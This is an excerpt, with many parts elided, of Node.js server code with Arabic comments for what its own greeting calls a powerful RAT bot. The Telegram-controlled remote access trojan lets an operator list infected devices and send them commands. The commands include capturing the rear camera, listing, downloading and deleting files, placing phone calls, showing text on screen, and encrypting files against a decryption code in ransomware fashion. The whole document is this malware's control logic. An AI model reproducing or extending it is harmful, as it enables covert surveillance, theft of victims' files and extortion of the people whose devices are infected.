...
io.on('connection', (socket) => {
    ...
    // إرسال إشعار اتصال إلى التيليجرام
    ...
    socket.on('getFiles', (files) => {
        ...
        files.forEach((file, index) => {
            ...
            // تجميع الأزرار في صفوف (كل 3 أزرار بصف)
        ...
        fileList.push([{
            text: '✯ العودة ✯',
            callback_data: socket.name + '|back-0'
        }]);
        
        bot.sendMessage(data.id, '✯ قائمة الملفات في الجهاز: ' + socket.name, {
    ...
    socket.on('fileRequest', (fileData) => {
        bot.sendMessage(data.id, '✯ تم تحميل الملف من الجهاز: ' + socket.name + '\n' + fileData, { parse_mode: 'HTML' });
    });
});

// استقبال الرسائل من التيليجرام
bot.on('message', (msg) => {
    ...
    if (text === '/start') {
        bot.sendMessage(data.id, 
            '✯ اهلا وسهلا في بوت رات قوي بوت تحكم بالاجهزه ✯\n' +
    ...
    // معالجة طلب تحديد جهاز لارسال الامر له
    if (appData.get('currentAct') === 'selectTarget') {
        ...
        bot.sendMessage(data.id, '✯ تم تنفيذ الطلب بنجاح', {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['📱 عرض الاجهزة المتصلة', '📱 ارسال امر لجهاز معين'],
    ...
    if (text === '📱 عرض الاجهزة المتصلة') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id, '✯ لايوجد اجهزة متصلة حالياً ✯', { parse_mode: 'HTML' });
        } else {
            ...
            bot.sendMessage(data.id, devicesList, { parse_mode: 'HTML' });
        }
    }
    
    // ارسال امر لجهاز معين
    if (text === '📱 ارسال امر لجهاز معين') {
        if (io.sockets.sockets.size === 0) {
            ...
            bot.sendMessage(data.id, '✯ اختر الجهاز الذي تريد ارسال الامر له:', {
                parse_mode: 'HTML',
                reply_markup: {
    ...
    if (text === '📱 القائمة الرئيسية') {
        bot.sendMessage(data.id, '✯ القائمة الرئيسية ✯', { parse_mode: 'HTML' });
    }
    
    // العودة
    if (text === '✯ العودة ✯') {
        bot.sendMessage(data.id, '✯ تم العودة للقائمة الرئيسية ✯', {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['📱 عرض الاجهزة المتصلة', '📱 ارسال امر لجهاز معين'],
    ...
    // تنفيذ الاوامر على الجهاز المختار
    if (actions.includes(text)) {
        ...
        if (text === '📸 كيمرا خلفية 📸') {
            ...
            appData.delete('currentSocket');
            bot.sendMessage(data.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
        }
            ...
            bot.sendMessage(data.id, '✯ ارسل مدة الاهتزاز بالمللي ثانية (مثال: 5000)', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ العودة ✯']],
                    resize_keyboard: true,
            ...
            bot.sendMessage(data.id, '✯ ارسل اسم الملف الذي تريد حذفه:', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ العودة ✯']],
                    resize_keyboard: true,
            ...
            bot.sendMessage(data.id, '✯ ارسل اسم الملف الذي تريد تحميله:', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ العودة ✯']],
                    resize_keyboard: true,
            ...
            bot.sendMessage(data.id, '✯ ارسل رقم الهاتف الذي تريد الاتصال به:', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ العودة ✯']],
                    resize_keyboard: true,
            ...
            bot.sendMessage(data.id, '✯ قائمة التحكم ✯', { parse_mode: 'HTML' });
        }
        else if (text === '⚠️ تشفير الملفات ⚠️') {
            appData.set('currentAct', 'encryptFiles');
            appData.set('currentSocket', socketId);
            
            bot.sendMessage(data.id, '✯ ارسل كود فك التشفير:', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ العودة ✯']],
                    resize_keyboard: true,
            ...
            bot.sendMessage(data.id, '✯ ارسل النص الذي تريد اظهاره:', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ العودة ✯']],
                    resize_keyboard: true,
    ...
    // معالجة الاوامر الإضافية (الردود على الكال بك)
